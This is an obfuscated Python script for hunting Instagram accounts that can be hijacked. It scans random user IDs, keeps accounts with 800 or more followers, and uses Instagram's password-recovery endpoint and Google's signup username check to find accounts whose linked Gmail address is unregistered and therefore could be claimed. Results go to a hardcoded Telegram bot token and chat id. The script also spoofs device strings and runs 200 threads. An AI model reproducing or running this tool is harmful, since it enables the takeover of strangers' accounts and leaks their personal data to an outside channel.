cyan = "\033[1m\033[36m"
c1 = '\x1b[38;5;120m'
p1 = '\x1b[38;5;150m'
fk = '\x1b[1;31m'
AA = '@gmail.com'
A9 = 'follower_count'
A8 = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
A7 = 'ig_sig_key_version'
A6 = 'signed_body'
A5 = 'application/x-www-form-urlencoded; charset=UTF-8'
A4 = (
    'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
    )
A3 = 'Content-Type'
A2 = 'Cookie'
A1 = 'User-Agent'
A0 = 'https://accounts.google.com'
z = 'en-US,en;q=0.9'
y = 'accounts.google.com'
x = 'authority'
w = 'pip install json'
v = input
m = 'tl.txt'
l = 'referer'
k = 'origin'
j = '__Host-GAPS'
i = 'application/x-www-form-urlencoded;charset=UTF-8'
h = 'google-accounts-xsrf'
a = '1'
Z = '*/*'
Y = 'user-agent'
X = 'content-type'
W = 'accept-language'
V = 'accept'
U = False
T = True
S = int
R = open
L = ''
K = range
J = '\x1b[1;39m'
I = Exception
F = None
C = str
B = print
import os as A
try:
    import cfonts
    from cfonts import render
except:
    A.system('pip install python-cfonts')
try:
    import requests as E
except:
    A.system('pip install requests')
try:
    from bs4 import BeautifulSoup
except:
    A.system('pip install bs4')
try:
    import json, re, os as A, sys
except:
    A.system(w)
try:
    from datetime import datetime
except:
    A.system('pip install re')
try:
    from user_agent import generate_user_agent as AB
except:
    A.system('pip install user_agent')
try:
    from user_agent import generate_user_agent as b
except:
    A.system(w)
try:
    from rich.console import Console
except:
    A.system('pip install rich')
try:
    from rich.panel import Panel
except:
    A.system('pip install threading')
try:
    import threading as AC, webbrowser
except:
    A.system('pip install random')
try:
    import random as D
except:
    A.system('pip install hashlib')
try:
    import hashlib
except:
    A.system('pip install uuid')
try:
    import uuid as n
except:
    A.system('pip install time')
try:
    from colorama import Fore as G, Style as c
except:
    A.system('pip install colorama')
import sys, os as A, sys, subprocess, importlib.util, time
from requests import post as AD
from random import choice as d
from random import randrange as e
o = 0
M = 0
N = 0
O = 0
P = 0
AK = D.randint(5, 208)
id = "7465964009"
token = "7391953657:AAFRkj6gZd2i4GWWJPZ0W-1M5PFRIPZFRn0"
def Q():
    global N, M, O, P
    B_temp = D.randint(5, 208)
    C_temp = (f'''
██████╗░██╗███████╗███████╗
██╔══██╗██║╚════██║╚════██║
██████╦╝██║░░███╔═╝░░███╔═╝
██╔══██╗██║██╔══╝░░██╔══╝░░
██████╦╝██║███████╗███████╗
╚═════╝░╚═╝╚══════╝╚══════╝
{cyan}════════════════        
{cyan}[ 𝟏 ] {c1}[𝐇𝐢𝐭] : [{M}]
{cyan}[ 𝟐 ] {fk}[𝐅𝐚𝐥𝐬𝐞] : [{N}]
{cyan}[ 𝟑 ] {p1}[𝐁𝐚𝐝] : [{O}]
''')
    sys.stdout.write(C_temp)
    sys.stdout.flush()

f = 'azertyuiopmlkjhgfdsqwxcvbn'

def q():
    try:
        D_str = L.join(d(f) for A in K(e(6, 9)))
        F_str = L.join(d(f) for A in K(e(3, 9)))
        A_str = L.join(d(f) for A in K(e(15, 30)))
        H_dict = {V: Z, W: 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6', X: i, h: a, Y: C(b())}
        J_resp = E.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=H_dict)
        match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            J_resp.text
        )
        # التأكد من أن النتيجة موجودة قبل استخدام group()
        if not match:
            raise Exception("لم يتم العثور على النمط المطلوب في الاستجابة")
        M_val = match.group(2)
        # إضافة تعريف للمتغيرين n1 و n2 لتجنب الخطأ
        n1 = "placeholder1"
        n2 = "placeholder2"
        N_dict = {j: A_str}
        O_dict = {x: y, V: Z, W: z, X: i, h: a, k: A0, l: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn', Y: b()}
        Po = {
            'f.req': '["' + ''.join({M_val}) + '","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        G_resp = E.post('https://accounts.google.com/_/signup/validatepersonaldetails', cookies=N_dict, headers=O_dict, data=Po)
        Q_val = C(G_resp.text).split('",null,"')[1].split('"')[0]
        A_cookie = G_resp.cookies.get_dict()[j]
        with R(m, 'w', encoding='utf-8') as S_file:
            S_file.write(f"{Q_val}//{A_cookie}\n")
    except I as T:
        B(T)
        q()


q()


def AR(user):
    try:
        B_headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            A1: 'Instagram 1000.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            A2: A4,
            A3: A5,
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        C_data = {A6:
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'
             + user + '"}', A7: '4'}
        D_resp = E.post(A8, headers=B_headers, data=C_data).json()
        email_val = D_resp['email']
    except:
        email_val = 'no REST !'
    return email_val


def AS(Id):
    try:
        A_val = S(Id)
        if 1 < A_val < 1279000:
            return 2010
        elif 1279001 <= A_val < 17750000:
            return 2011
        elif 17750001 <= A_val < 279760000:
            return 2012
        elif 279760001 <= A_val < 900990000:
            return 2013
        elif 900990001 <= A_val < 1629010000:
            return 2014
        elif 1900000000 <= A_val < 2500000000:
            return 2015
        elif 2500000000 <= A_val < 3713668786:
            return 2016
        elif 3713668786 <= A_val < 5699785217:
            return 2017
        elif 5699785217 <= A_val < 8507940634:
            return 2018
        elif 8507940634 <= A_val < 21254029834:
            return 2019
        else:
            return '2020-2023'
    except I:
        return 'hhhh'
def r(username, gg):
    C_val = username
    global o
    A_obj = g.get(C_val, {})
    L_val = A_obj.get('pk', F)
    M_val = A_obj.get('full_name', F)
    G_val = A_obj.get(A9, F)
    N_val = A_obj.get('following_count', F)
    J_val = A_obj.get('media_count', F)
    W_val = A_obj.get('is_private', F)
    O_val = A_obj.get('biography', F)
    X_val = A_obj.get('is_verified', F)
    P_val = A_obj.get('is_business', F)
    try:
        if G_val and J_val:
            if S(G_val) >= 800 and S(J_val) >= 5:
                D_flag = T
            else:
                D_flag = U
        else:
            D_flag = U
    except:
        D_flag = U
    o += 1
    K_str = f"""
𓂀 ℕ𝕖𝕨 𝔸𝕔𝕔𝕠𝕦𝕟𝕥 𓂀
════════════════   
NAME       :〘{M_val}〙
USERNAME   :  〘@{C_val}〙
EMAIL      :  〘{C_val}@gmail.com〙
META       :  〘{D_flag}〙
BIZZ META   :  〘{P_val}〙
FOLLOWERS  :  〘{G_val}〙
FOLLOWING  :  〘{N_val}〙
YEAR       :  〘{AS(L_val)}〙
ID         :  〘{L_val}〙
POSTS      :  〘{J_val}〙
BIO        :  〘{O_val}〙
RESET      :  〘{AR(C_val)}〙
LINK    : https://www.instagram.com/{C_val}
════════════════
TELEGRAM >> @OldRingz | @NawabiPy
"""
    with R('Joker.txt', 'a', encoding='utf-8') as Q_file:
        Q_file.write(f"{K_str}\n")
    try:
        try:
            E.get(f"{'https://api.telegram.org/bot'}{token}{'/sendMessage?chat_id='}{id}{'&text='}{K_str}")
        except I as V:
            B(" Error ")
    except:
        B("  Error ")
def AT(email):
    B_char = '@'
    A_email = email
    global O, M
    try:
        if B_char in A_email:
            A_email = C(A_email).split(B_char)[0]
        try:
            # تعديل قراءة الملف للتأكد من أن هناك سطرًا أولاً وإلا استخدام قيمة افتراضية
            lines = R(m, 'r').read().splitlines()
            if lines:
                G_line = lines[0]
            else:
                G_line = "default//default"
        except:
            lines = R(m, 'r').read().splitlines()
            if lines:
                G_line = lines[0]
            else:
                G_line = "default//default"
        # التأكد من وجود الفاصل المطلوب '//' وإلا استخدام القيمة الافتراضية
        if '//' in G_line:
            D_val, H_val = G_line.split('//', 1)
        else:
            D_val, H_val = "default", "default"
        I_cookies = {j: H_val}
        J_headers = {x: y, V: Z, W: z, X: i, h: a, k: A0, l: 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + D_val, Y: b()}
        K_params = {'TL': D_val}
        L_data = ('continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'
                  + D_val + '%22%2C%22' + A_email +
                  '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&')
        N_resp = AD('https://accounts.google.com/_/signup/usernameavailability', params=K_params, cookies=I_cookies, headers=J_headers, data=L_data)
        if '"gf.uar",1' in C(N_resp.text):
            M += 1
            Q()
            if B_char not in A_email:
                P_comb = A_email + AA
                E_split, F_split = P_comb.split(B_char)
                r(E_split, F_split)
            else:
                E_split, F_split = A_email.split(B_char)
                r(E_split, F_split)
        else:
            O += 1
            Q()
    except:
        pass


def AZ(value):
    A_val = value
    A_val = float(A_val)
    if A_val >= 1000000:
        return f"{A_val / 1000000:{(lambda x, y: ''.join(chr(q ^ x) for q in y))(12, [34, 61, 106])}}{'m'}"
    elif A_val >= 1000:
        return f"{A_val / 1000:{(lambda x, y: ''.join(chr(q ^ x) for q in y))(2, [44, 51, 100])}}{'k'}"
    return C(S(A_val))


def AU(email):
    A_email = email
    global P, N
    D_agent = AB()
    F_prefix = 'android-'
    G_device = F_prefix + hashlib.md5(C(n.uuid4()).encode()).hexdigest()[:16]
    B_uuid = C(n.uuid4())
    H_headers = {A1: D_agent, A2: A4, A3: A5}
    I_data = {A6: '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + 
              json.dumps({'_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj', 'adid': B_uuid, 'guid': B_uuid, 'device_id': G_device, 'query': A_email}),
              A7: '4'}
    J_text = E.post(A8, headers=H_headers, data=I_data).text
    if A_email in J_text:
        AT(A_email)
        P += 1
        Q()
    else:
        N += 1
        Q()


g = {}
s = []


def t(bbk, Ido):
    A_val = C(D.randrange(bbk, Ido))
    if A_val not in s:
        s.append(A_val)
        return A_val
    else:
        return t(bbk, Ido)


def AV():
    O_str = 'user'
    N_str = 'data'
    M_str = 'PolarisUserHoverCardContentV2Query'
    J_str = '; SM-T'
    while T:
        try:
            P_suffix = AA
            Q_val = 10000
            R_val = 21254029834
            while T:
                B_rand = C(D.randint(150, 999))
                S_device = 'Instagram 311.0.0.32.118 Android (' + ['23/6.0', '24/7.0', '25/7.1.1', '26/8.0', '27/8.1', '28/9.0'][D.randint(0, 5)] + '; ' + C(D.randint(100, 1300)) + 'dpi; ' + C(D.randint(200, 2000)) + 'x' + C(D.randint(200, 2000)) + '; ' + ['SAMSUNG', 'HUAWEI', 'LGE/lge', 'HTC', 'ASUS', 'ZTE', 'ONEPLUS', 'XIAOMI', 'OPPO', 'VIVO', 'SONY', 'REALME'][D.randint(0, 11)] + J_str + B_rand + J_str + B_rand + '; qcom; en_US; 545986' + C(D.randint(111, 999)) + ')'
                U_val = t(Q_val, R_val)
                G_hash = L.join(D.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for A in K(32))
                b_headers = {V: Z, W: 'en,en-US;q=0.9', X: 'application/x-www-form-urlencoded', 'dnt': a, k: 'https://www.instagram.com', 'priority': 'u=1, i',  'referrer': 'https://www.instagram.com/cristiano/following/', Y: S_device, 'x-fb-friendly-name': M_str, 'x-fb-lsd': G_hash}
                c_data = {'lsd': G_hash, 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': M_str, 'variables': '{"userID":"' + C(U_val) + '","username":"cristiano"}', 'server_timestamps': 'true', 'doc_id': '7717269488336001'}
                H_post = E.post('https://www.instagram.com/api/graphql', headers=b_headers, data=c_data)
                A_username = H_post.json().get(N_str, {}).get(O_str, {}).get('username')
                g[A_username] = H_post.json().get(N_str, {}).get(O_str, {})
                d_obj = g.get(A_username, {})
                e_val = d_obj.get(A9, F)
                if e_val >= 800:
                
                    f_val = A_username + P_suffix
                    AU(f_val)
        except I as h_ex:
            pass
u = []
def AW():
    for B_index in K(200):
        A_thread = AC.Thread(target=AV)
        A_thread.start()
        u.append(A_thread)
    for A_thread in u:
        A_thread.join()
AW()
